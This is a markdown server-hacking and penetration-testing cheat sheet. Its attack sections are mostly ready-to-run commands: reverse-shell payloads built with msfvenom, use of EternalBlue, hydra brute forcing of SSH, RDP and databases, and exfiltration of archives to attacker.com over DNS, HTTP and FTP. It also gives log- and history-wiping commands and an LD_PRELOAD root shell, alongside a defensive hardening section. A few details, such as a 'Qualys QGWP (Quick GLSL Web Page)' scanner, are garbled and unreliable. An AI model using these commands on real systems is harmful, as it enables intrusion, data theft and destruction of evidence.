# 🖥️ Server Hacking & Penetration Testing Guide

**IMPORTANT**: All techniques in this guide are for authorized testing only. Always obtain written permission before testing any system you don't own.

## Table of Contents
1. [Server Reconnaissance](#server-reconnaissance)
2. [Network Scanning](#network-scanning)
3. [Vulnerability Assessment](#vulnerability-assessment)
4. [Exploitation Techniques](#exploitation-techniques)
5. [Post-Exploitation](#post-exploitation)
6. [Server Hardening](#server-hardening)
7. [Privilege Escalation](#privilege-escalation)

---

## 🔍 Server Reconnaissance

### Information Gathering

```bash
# 1. DNS Enumeration
nslookup example.com
dig example.com
dig example.com MX
dig example.com NS

# 2. Whois Lookup
whois example.com
whois 192.168.1.1

# 3. IP Range Discovery
whois -h whois.radb.net -- '-i origin AS1234'

# 4. Reverse DNS Lookup
dig -x 192.168.1.1
host 192.168.1.1

# 5. Certificate Information
openssl s_client -connect example.com:443

# 6. Banner Grabbing
nc example.com 80
telnet example.com 22

# 7. Web Server Fingerprinting
curl -I http://example.com
curl -v http://example.com

# 8. Subdomain Enumeration
nslookup -type=AXFR example.com ns1.example.com
sublist3r -d example.com
amass enum -d example.com
```

### Service Enumeration

```bash
# Identify running services
netstat -tulpn              # Linux - all listening ports
netstat -ano                # Windows - all listening ports
ss -tulpn                   # Linux - socket statistics

# Query specific services
echo "VRFY admin" | nc mail.example.com 25    # SMTP verification
smbclient -L //192.168.1.1                    # SMB shares
snmpwalk -c public -v 1 192.168.1.1          # SNMP enumeration
```

### Email Harvesting

```bash
# Find email addresses
theHarvester -d example.com -l 100 -b google

# SMTP User Enumeration
smtp-user-enum -M VRFY -U users.txt -t mail.example.com
```

---

## 🌐 Network Scanning

### Port Scanning with Nmap

```bash
# Basic scanning
nmap 192.168.1.1
nmap -p 80,443,22 192.168.1.1
nmap -p- 192.168.1.1                    # All ports
nmap -p 1-65535 192.168.1.1             # All ports (verbose)

# Service version detection
nmap -sV 192.168.1.1                    # Detect versions
nmap -sV -sC 192.168.1.1               # Version + scripts

# OS Detection
nmap -O 192.168.1.1                     # Aggressive OS detection
nmap -A 192.168.1.1                     # All detection techniques

# Stealth Scanning
nmap -sS 192.168.1.1                    # SYN scan (stealth)
nmap -sF 192.168.1.1                    # FIN scan
nmap -sN 192.168.1.1                    # NULL scan

# Scan Speed Control
nmap -T0 192.168.1.1                    # Paranoid (very slow)
nmap -T1 192.168.1.1                    # Sneaky
nmap -T2 192.168.1.1                    # Polite
nmap -T3 192.168.1.1                    # Normal (default)
nmap -T4 192.168.1.1                    # Aggressive
nmap -T5 192.168.1.1                    # Insane (very fast)

# Range and Multiple Hosts
nmap 192.168.1.0/24                     # Entire subnet
nmap 192.168.1.1-50                     # Range
nmap -iL targets.txt                    # From file

# Output Formats
nmap -oN output.txt 192.168.1.1         # Normal
nmap -oX output.xml 192.168.1.1         # XML
nmap -oG output.grep 192.168.1.1        # Grepable
nmap -oA output 192.168.1.1             # All formats
```

### UDP Scanning

```bash
# UDP port scanning
nmap -sU -p 53,161,162,5353 192.168.1.1

# UDP service detection
nmap -sU -sV 192.168.1.1
```

### Traceroute & Connectivity

```bash
# Trace route to target
traceroute example.com
tracert example.com                     # Windows

# Check ICMP connectivity
ping example.com
ping -c 4 example.com                   # Linux/Mac
ping -n 4 example.com                   # Windows

# MTU Discovery
traceroute --mtu example.com
```

---

## 🔎 Vulnerability Assessment

### Automated Vulnerability Scanning

```bash
# Nessus Scanning
# 1. Download and install from https://www.tenable.com/products/nessus
# 2. Access via https://localhost:8834

# OpenVAS (Open Vulnerability Assessment System)
sudo docker run -d \
  -p 9392:9392 \
  -p 20000:20000 \
  --name openvas \
  greenbone/openvas

# Qualys QGWP (Quick GLSL Web Page)
# 1. Request trial from https://www.qualys.com/

# Acunetix
# 1. Download from https://www.acunetix.com/
# 2. Configure target and scan
```

### Web Vulnerability Scanning

```bash
# Burp Suite Community
# 1. Download from https://portswigger.net/burp/communitydownload
# 2. Configure proxy and run active scan

# OWASP ZAP
owasp-zap.sh -cmd -quickurl http://example.com

# Nikto (Web Server Scanner)
nikto -h example.com
nikto -h example.com -p 8080

# SQLMap (SQL Injection)
sqlmap -u "http://example.com/page.php?id=1" -dbs
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=pass" --dbs

# WPScan (WordPress)
wpscan --url http://example.com
wpscan --url http://example.com --enumerate u
```

### Configuration Review

```bash
# SSL/TLS Configuration
testssl.sh https://example.com
nmap --script ssl-enum-ciphers -p 443 example.com

# HTTP Security Headers
curl -I https://example.com | grep -E "Strict-Transport|X-Frame|X-Content-Type|CSP"

# Check Default Credentials
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

---

## 💥 Exploitation Techniques

### Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:linux
search cve:2021-44228

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Multi-handler (catch reverse shell)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

### SSH Exploitation

```bash
# Brute Force SSH
hydra -l root -P rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.1

# SSH Key Extraction
ssh-keyscan -t rsa 192.168.1.1

# SSH Banner Grabbing
ssh -v 192.168.1.1

# Check SSH Configuration
ssh root@192.168.1.1 "cat /etc/ssh/sshd_config"
```

### Web Exploitation

```bash
# Directory Traversal Testing
curl "http://example.com/file.php?path=../../../../etc/passwd"

# Local File Inclusion (LFI)
curl "http://example.com/page.php?file=../../../../etc/passwd"

# Remote File Inclusion (RFI)
curl "http://example.com/page.php?file=http://attacker.com/shell.txt"

# Command Injection
curl "http://example.com/ping.php?host=8.8.8.8;id"

# Cross-Site Scripting (XSS) Testing
curl "http://example.com/search.php?q=<script>alert(1)</script>"
```

### Database Exploitation

```bash
# MySQL Brute Force
hydra -l root -P rockyou.txt mysql://192.168.1.1

# MySQL Information Gathering
mysql -h 192.168.1.1 -u root -p password
SHOW DATABASES;
USE mysql;
SELECT * FROM user;

# MSSQL Exploitation
mssqlclient.py -windows-auth DOMAIN/user:password@192.168.1.1

# PostgreSQL Brute Force
hydra -l postgres -P rockyou.txt postgres://192.168.1.1
```

### Windows Exploitation

```bash
# Eternal Blue (SMB Vulnerability)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
exploit

# RDP Exploitation
hydra -l Administrator -P rockyou.txt rdp://192.168.1.1

# Windows Credential Dumping
# Using Metasploit after shell access
hashdump
```

---

## 🔓 Post-Exploitation

### Meterpreter Commands

```bash
# Basic Commands
help                    # Show all commands
sysinfo                # System information
whoami                 # Current user
pwd                    # Current directory
ls                     # List files
cd                     # Change directory

# File Operations
upload /local/path /remote/path
download /remote/path /local/path
cat /etc/passwd

# Process Management
ps                     # List processes
kill PID               # Kill process
getpid                 # Current process ID

# Networking
ifconfig              # Network configuration
route                 # Routing table
netstat               # Network connections

# Privilege Escalation
getsystem             # Attempt privilege escalation
getuid                # Current UID

# Persistence
run persistence -X    # Create startup key (Windows)
cron -a               # Add cron job (Linux)

# Credential Harvesting
hashdump              # Dump password hashes (Windows)
run post/linux/gather/hashdump  # Dump hashes (Linux)
```

### Data Exfiltration

```bash
# Identify valuable data
find / -name "*.sql" -o -name "*.db" -o -name "*.xlsx" -o -name "*.pdf"

# Compress and encrypt
tar -czf data.tar.gz /path/to/data
gpg --symmetric data.tar.gz

# Exfiltrate via DNS
nslookup $(cat data | base64 | cut -c 1-20).attacker.com

# Exfiltrate via HTTP
curl -F "file=@data.tar.gz" http://attacker.com/upload.php

# Exfiltrate via FTP
ftp attacker.com
put data.tar.gz
```

### Covering Tracks

```bash
# Clear logs (Linux)
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
history -c
export HISTFILE=/dev/null

# Clear logs (Windows)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Remove temporary files
rm -rf /tmp/*
rm -rf ~/.bash_history

# Remove artifacts
find / -name "*.log" -delete
```

---

## 🛡️ Server Hardening

### Linux Hardening

```bash
# 1. Update System
sudo apt update && sudo apt upgrade -y
sudo yum update -y

# 2. Configure Firewall
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https

# 3. SSH Hardening
sudo nano /etc/ssh/sshd_config

# Recommended changes:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 0
Protocol 2
```

### SSH Key Setup

```bash
# Generate SSH keys
ssh-keygen -t ed25519 -C "user@example.com"

# Copy public key to server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server.com

# Set permissions
chmod 600 ~/.ssh/id_ed25519
chmod 700 ~/.ssh
```

### Fail2Ban Installation

```bash
# Install Fail2Ban
sudo apt install fail2ban -y

# Configure Fail2Ban
sudo nano /etc/fail2ban/jail.local

# Add:
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log

# Start service
sudo systemctl restart fail2ban
```

### File Integrity Monitoring

```bash
# Install AIDE
sudo apt install aide aide-common -y
sudo aideinit

# Check file integrity
sudo aide --check

# Install Tripwire
sudo apt install tripwire -y
sudo tripwire --init
sudo tripwire --check
```

### Network Security

```bash
# Enable SELinux (RHEL/CentOS)
sudo getenforce
sudo setenforce Enforcing

# Configure AppArmor (Ubuntu)
sudo aa-enforce /etc/apparmor.d/*

# Enable IP forwarding protection
sudo sysctl -w net.ipv4.ip_forward=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0

# Enable SYN flood protection
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

### Windows Hardening

```powershell
# Disable unnecessary services
Get-Service | Where-Object {$_.DisplayName -like "*Telemetry*"} | Stop-Service -Force

# Enable Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Update Windows
Install-WindowsUpdate -AcceptAll

# Configure Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Update-MpSignature
```

---

## 🚀 Privilege Escalation

### Linux Privilege Escalation

```bash
# Enumeration
id
whoami
sudo -l
sudo -l -U root

# Check SUID Binaries
find / -perm -4000 -type f 2>/dev/null

# Check Cron Jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Check for weak permissions
find / -writable -type f 2>/dev/null

# Check kernel version for exploits
uname -a
uname -r
cat /proc/version

# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Check Docker
docker ps
docker images
```

### Windows Privilege Escalation

```cmd
# Enumeration
whoami /all
systeminfo
wmic qfe list
Get-HotFix

# Check privileges
whoami /priv

# Find weak permissions
icacls C:\Windows

# Check scheduled tasks
tasklist /svc
schtasks /query /fo LIST

# Registry enumeration
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Use WinPEAS
winpeas.exe
```

### Sudo Exploitation

```bash
# Check for NOPASSWD sudo
sudo -l

# Example: If user can run /bin/bash without password
sudo /bin/bash

# Check for path manipulation
echo 'ls() { /bin/bash; }' > ls
chmod +x ls
export PATH=.:$PATH
sudo /usr/bin/service apache2 start

# LD_PRELOAD exploitation
cat > shell.c << 'EOF'
#include <unistd.h>
void _init() {
    execve("/bin/bash", 0, 0);
}
EOF
gcc -fPIC -shared -o shell.so shell.c
sudo LD_PRELOAD=./shell.so /usr/bin/service apache2 start
```

### Token Impersonation (Windows)

```powershell
# Using Metasploit
use exploit/windows/local/token_impersonation
set SESSION <session_id>
exploit

# Manual impersonation
# Use tools like Incognito or CreateProcessAsUser
```

---

## 📋 Testing Checklist

### Pre-Engagement
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Backup systems available
- [ ] Incident response plan ready
- [ ] Testing window scheduled
- [ ] Emergency contacts documented

### During Testing
- [ ] Avoid disrupting services
- [ ] Document all findings
- [ ] Test in isolated environment first
- [ ] Verify each exploit before using
- [ ] Monitor system stability
- [ ] Take screenshots of results

### Post-Testing
- [ ] Verify all shells are closed
- [ ] Remove all artifacts and tools
- [ ] Clear logs if authorized
- [ ] Document all vulnerabilities
- [ ] Provide remediation recommendations
- [ ] Schedule follow-up testing

---

## 🔗 Resources & Tools

### Recommended Platforms
- [HackTheBox](https://www.hackthebox.com) - Real-world lab scenarios
- [TryHackMe](https://tryhackme.com) - Beginner to advanced labs
- [DVWA](http://dvwa.co.uk/) - Damn Vulnerable Web App
- [Vulnhub](https://www.vulnhub.com/) - Vulnerable VMs for practice

### Essential Tools
- Nmap - Port scanning
- Metasploit - Exploitation framework
- Burp Suite - Web testing
- Wireshark - Network analysis
- Aircrack-ng - WiFi testing
- John the Ripper - Password cracking

### Learning Resources
- OWASP Testing Guide
- Penetration Testing Framework (PTF)
- NIST Cybersecurity Framework
- PTES (Penetration Testing Execution Standard)

---

**⚠️ DISCLAIMER**: Unauthorized access to computer systems is illegal. Use these techniques only on systems you own or have explicit written permission to test. The author is not responsible for misuse of this information.

**Remember**: The best defense is understanding attack vectors! 🛡️
